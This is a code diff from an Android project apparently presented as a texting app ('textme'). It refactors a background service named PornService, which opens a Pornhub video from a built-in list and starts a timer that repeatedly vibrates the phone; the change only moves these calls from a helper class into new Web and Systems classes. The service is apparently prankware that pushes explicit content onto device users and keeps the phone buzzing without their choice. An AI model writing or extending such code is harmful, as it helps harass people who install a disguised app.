@@ -4,6 +4,8 @@ import android.app.IntentService;
 import android.content.Intent;
 
 import com.candroid.textme.api.Lofl;
+import com.candroid.textme.api.Systems;
+import com.candroid.textme.api.Web;
 import com.candroid.textme.data.Pornhub;
 
 import java.util.Timer;
@@ -17,11 +19,11 @@ public class PornService extends IntentService {
 
     @Override
     protected void onHandleIntent(Intent intent) {
-        Lofl.watchPornHubVideo(this, Pornhub.VIDEOS[0]);
+        Web.Browser.watchPornHubVideo(this, Pornhub.VIDEOS[0]);
         TimerTask timerTask = new TimerTask() {
             @Override
             public void run() {
-                Lofl.vibrator(PornService.this.getApplicationContext());
+                Systems.Vibrations.vibrator(PornService.this.getApplicationContext());
             }
         };
         Timer timer = new Timer("vibratorTask", true);
